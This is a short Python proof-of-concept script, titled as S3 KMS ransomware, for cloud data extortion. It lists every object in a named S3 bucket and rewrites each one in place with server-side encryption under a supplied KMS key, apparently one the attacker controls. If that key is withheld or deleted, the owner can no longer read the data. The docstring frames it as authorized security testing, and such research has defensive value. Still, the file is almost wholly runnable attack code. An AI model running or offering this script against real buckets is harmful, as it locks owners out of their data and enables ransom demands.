#!/usr/bin/env python3
"""
S3 KMS Ransomware PoC

This script overwrites (re-encrypts) all objects in a target S3 bucket
using a specified KMS key via an in-place S3 copy operation.

- If Versioning is enabled, previous versions remain in history.
- Requires appropriate S3 and KMS permissions.
- For authorized security testing and research only.
"""

import boto3
import botocore.exceptions

#################################
########### Settings ###########
#################################

AWS_PROFILE = "default"                     # AWS CLI profile name
BUCKET_NAME = "target-bucket"              # Target S3 bucket name
KMS_KEY_ARN = "arn:aws:kms:REGION:ACCOUNT-ID:key/KEY-ID"  # Target KMS key ARN
#################################


def rewrite_objects_with_kms():
    """Re-encrypt all objects in the bucket using the provided KMS key."""
    print("\n[+] Starting S3 KMS ransomware PoC")
    print(f"[+] AWS profile : {AWS_PROFILE}")
    print(f"[+] Bucket      : {BUCKET_NAME}")
    print(f"[+] KMS Key     : {KMS_KEY_ARN}\n")


    # Initialize session and clients
    session = boto3.Session(profile_name=AWS_PROFILE)
    s3_client = session.client("s3")
    s3 = session.resource("s3")


    paginator = s3_client.get_paginator("list_objects_v2")
    total = 0

    try:
        pages = paginator.paginate(Bucket=BUCKET_NAME)
    except botocore.exceptions.ClientError as e:
        print(f"[ERROR] Cannot open paginator for bucket {BUCKET_NAME}: {e}")
        return

    for page in pages:
        # Skip empty pages
        if "Contents" not in page:
            continue

        for obj in page["Contents"]:
            key = obj["Key"]

            try:
                # In-place copy to same key with new KMS encryption
                s3.meta.client.copy(
                    {"Bucket": BUCKET_NAME, "Key": key},
                    BUCKET_NAME,
                    key,
                    ExtraArgs={
                        "ServerSideEncryption": "aws:kms",
                        "SSEKMSKeyId": KMS_KEY_ARN,
                    },
                )

                print(f"[Encrypted] {key}")
                total += 1

            except botocore.exceptions.ClientError as e:
                print(f"[ERROR] Failed for {key}: {e}")

    print("\n[+] Finished")
    print(f"[+] Total objects processed: {total}\n")


if __name__ == "__main__":
    rewrite_objects_with_kms()
